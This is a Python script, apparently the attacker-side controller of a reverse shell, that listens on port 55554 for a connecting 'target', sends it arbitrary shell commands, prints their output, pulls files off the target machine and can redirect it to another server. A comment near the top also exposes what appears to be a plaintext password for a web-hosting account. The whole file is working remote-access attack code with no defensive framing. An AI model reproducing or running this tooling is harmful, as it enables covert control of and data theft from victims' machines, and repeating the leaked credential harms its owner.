#!/usr/bin/python
#-*-coding:utf8;-*-
#qpy:console
import socket
import time
import sys
import os

# password of 000webhost = (#yT8w5JFz^*K6ELf)AVK)

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'


def clear():
    os.system("clear")

clear()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

global host
global port

host = ""
port = 55554
try:
    s.bind((host,port))

    print(GREEN+"[WAITING FOR THE CONNECTION...]"+END)
    s.listen(5)

    (conn,addr) = s.accept()
    print(YELLOW+"[TARGET ADDRS = "+END+GREEN+addr[0]+END)

except Exception as e:
    print(RED,"[!][!] ",e,END)
    exit()

except KeyboardInterrupt:
    clear()
    print(RED+"[KEYBOAD INTERRUPT Ctrl + C] Waite...")
    try:
        input("[Peres_Enter_To_Exit...]"+END)
        clear()
        s.close()
        exit(0)
    except KeyboardInterrupt:
          print(YELLOW+"stupid can't escape this reality"+END)
          s.close()
          exit()
          pass

help = YELLOW + """\n\t\t-------------- Help ------------------\n
    Commands\t\tUse\t\t\t\tExample"""+END+GREEN+"""
    l-host\t\tlocal-host <command>\t\tlocal-host ls
    send      \t\tsend <file name>   \t\tsend music.mp4
    server\t\tserver <IP:PORT>   \t\tserver 127.0.0.1:468

    For more information type the name of the command
    """ + END
def Help(com):

    if com == "l-host":
        print(GREEN+"Commands\t\tUse"+END+"\n")
        print(YELLOW+"l-host\t\tl-host <command> : Executing command on localhost or current hosting machine")
        print("\nExample : l-host ls or pwd any Linux command"+END)

    elif com == "send":
        print(GREEN+"Commands\t\tUse"+END+"\n")
        print(YELLOW+"send      \t\tsend <file name> : send file to the host")
        print("\nExample : send music.mp3 or send dir_name1/dir_name2/music.mp3"+END)
    elif com == "server":
        print(GREEN+"Commands\t\tUse"+END+"\n")
        print(YELLOW+"server      \t\tserver <IP:PORT> ")
        print("\nExample : server 127.0.0.1:7382"+END)
    else:
        print(help)

def LocalHost(com):
    print(YELLOW+"\n\n\n"+"-"*50+END)
    print(GREEN+"[.......BEGINNING EXECUTING COMMAND ON LOCALHOST.......]"+END)
    print(YELLOW, "-"*50,END, "\n")

    if com[:2] == "cd":
        try:
            os.chdir(com[3:])
        except Exception as e:
            print(e)

    elif com[:2] == "ls":
        com = ("ls --color" + com[3:])
        os.system(com)

    else:
        os.system(com)
    print(YELLOW+"\n"+"-"*50+END)
    print(GREEN+"[...................END OF EXECUTING...................]"+END)
    print(YELLOW,"-"*50,END, "\n\n\n")

def recive():
    print(YELLOW+"sending..."+END)
    file_name = conn.recv(100).decode()
    file_siz = conn.recv(100).decode()

    with open("/sdcard/received/"+file_name,"wb") as file:

        #The time when the data start recving 
        start_time = time.time()

        while True:
            data = conn.recv(1024)
            if not(data):
                break
            file.write(data)
                
        #The time when the data stop recving
        end_time = time.time()

    print("File send successfully in ", end_time - start_time)

while True:

    try:
        com = input(BLUE+"[<"+END+RED+addr[0]+END+GREEN+">Net-cat]"+END+BLUE+"> "+END+GREEN)
        """help me"""+END
        if com[:4]=="send":

            if len(com) == 4:
                Help(com)
            else:
                conn.send(str.encode(com))
                recive()

        elif com[:6] == "l-host":

            if len(com) == 6:
                Help(com)

            else:
                com = com[7:]
                LocalHost(com)

        elif com == "help":
            Help(com)
        elif com[:6] == "server":
            if len(com) == 6:
                Help(com)
            else:
                if ":" in com:
                    conn.send(str.encode(com))
                else:
                    print(RED+"Invalid addres!!"+END)
        else:
            if com == "" or com == (" " * len(com)):
                com = RED+"echo '[!][!] cannot execute empty commands :p'"+END 

            conn.send(str.encode(com))

            if com == "exit" or com == "quite":
                input(RED+"[Peres_Enter_To_Exit...]"+END)
                print(MAGENTA+"[EXITING... Good Bay...]"+END)
                conn.send(str.encode(com))
                break
            m = str(conn.recv(999999999),"utf-8")
            print(m)

    except Exception as e:
        print(e)

    except KeyboardInterrupt:
        clear()
        print(RED+"[KEYBOAD INTERRUPT Ctrl + C] Waite..."+END)
        try:
            input(MAGENTA+"[Peres_Enter_To_Continuse...]"+END)
            clear()
            pass
        except  KeyboardInterrupt:
            print(YELLOW+"stupid can't escape this reality"+END)
            pass

conn.close()
s.close()
